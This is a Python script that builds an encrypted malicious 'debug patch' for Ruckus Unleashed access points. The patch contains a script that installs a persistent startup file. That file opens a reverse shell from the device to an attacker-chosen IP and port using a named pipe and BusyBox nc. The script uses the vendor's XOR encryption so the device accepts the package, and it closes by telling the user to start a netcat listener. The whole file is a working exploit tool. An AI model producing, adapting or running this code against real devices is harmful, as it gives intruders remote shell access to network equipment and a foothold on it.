#!/usr/bin/env python3

import os
import struct
import tarfile
import tempfile
import shutil
import argparse

def parse_args():
    parser = argparse.ArgumentParser(description="Create Ruckus exploit with reverse shell")
    parser.add_argument("ip", help="IP address for the reverse shell to connect back to")
    parser.add_argument("-p", "--port", type=int, default=4444,
                        help="Port for the reverse shell (default: 4444)")
    return parser.parse_args()

def rks_encrypt(input_path, output_path):
    """Encrypt file using Ruckus's custom XOR encryption."""
    (xor_int, xor_flip) = struct.unpack('QQ', b')\x1aB\x05\xbd,\xd6\xf25\xad\xb8\xe0?T\xc58')
    structInt8 = struct.Struct('Q')
    
    with open(input_path, "rb") as input_file:
        with open(output_path, "wb") as output_file:
            input_len = os.path.getsize(input_path)
            input_blocks = input_len // 8
            output_int = 0
            input_data = input_file.read(input_blocks * 8)
            
            for input_int in struct.unpack_from(str(input_blocks) + "Q", input_data):
                output_int ^= xor_int ^ input_int
                xor_int ^= xor_flip
                output_file.write(structInt8.pack(output_int))
            
            input_block = input_file.read()
            input_padding = 8 - len(input_block)
            input_int = structInt8.unpack(input_block.ljust(8, bytes([input_padding | input_padding << 4])))[0]
            output_int ^= xor_int ^ input_int
            output_file.write(structInt8.pack(output_int))

def create_files(temp_dir, ip, port):
    """Create the required files for the Ruckus patch with reverse shell."""
    # Create upgrade_tool.sh
    upgrade_tool_sh = os.path.join(temp_dir, "upgrade_tool.sh")
    with open(upgrade_tool_sh, "w") as f:
        f.write("exit 1\n")
    
    # Create upgrade_tool with reverse shell payload specifically for Ruckus MIPS device
    upgrade_tool = os.path.join(temp_dir, "upgrade_tool")
    with open(upgrade_tool, "w") as f:
        f.write(f"""cp -f /tmp/unleashed_upgrade/upgrade_tool.sh /tmp/unleashed_upgrade/upgrade_tool

cat <<EOF >/writable/etc/scripts/bringdaruckus.sh
#!/bin/sh
#RUCKUS#
/bin/stty echo

# BusyBox nc reverse shell - confirmed available on the device
# Create a named pipe for bidirectional communication
rm -f /tmp/backpipe
mkfifo /tmp/backpipe

# Start the reverse shell connection using busybox nc
cat /tmp/backpipe | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/backpipe

# Clean up the pipe when done
rm -f /tmp/backpipe
EOF
chmod +x /writable/etc/scripts/bringdaruckus.sh

echo Patched with Reverse Connection to {ip}:{port}
exit 1
""")
    
    # Create upgrade_download_tool.sh (copy of upgrade_tool.sh)
    upgrade_download_tool_sh = os.path.join(temp_dir, "upgrade_download_tool.sh")
    shutil.copy(upgrade_tool_sh, upgrade_download_tool_sh)
    
    # Make them executable
    os.chmod(upgrade_tool_sh, 0o755)  # rwxr-xr-x
    os.chmod(upgrade_tool, 0o755)     # rwxr-xr-x
    
    return upgrade_tool_sh, upgrade_tool, upgrade_download_tool_sh

def create_and_encrypt_package(temp_dir, files):
    """Create tar archive and encrypt it."""
    tar_path = os.path.join(temp_dir, "unleashed.patch.tgz")
    output_path = "reverse-shell.dbg"
    
    # Create tar archive
    with tarfile.open(tar_path, "w:gz") as tar:
        for file_path in files:
            tar.add(file_path, arcname=os.path.basename(file_path))
    
    # Encrypt the archive
    rks_encrypt(tar_path, output_path)
    print(f"Created encrypted patch: {output_path}")

def main():
    """Main execution flow."""
    # Parse command line arguments
    args = parse_args()
    ip = args.ip
    port = args.port
    
    print(f"Creating Ruckus exploit with reverse shell to {ip}:{port}")
    
    # Create temporary directory
    with tempfile.TemporaryDirectory() as temp_dir:
        # Create necessary files
        files = create_files(temp_dir, ip, port)
        
        # Create tar archive and encrypt it
        create_and_encrypt_package(temp_dir, files)
        
        # Temporary directory will be automatically cleaned up
    
    print(f"Done. The device will connect back to {ip}:{port} when exploited.")
    print(f"Make sure to start a listener with: nc -lvnp {port}")

if __name__ == "__main__":
    main()
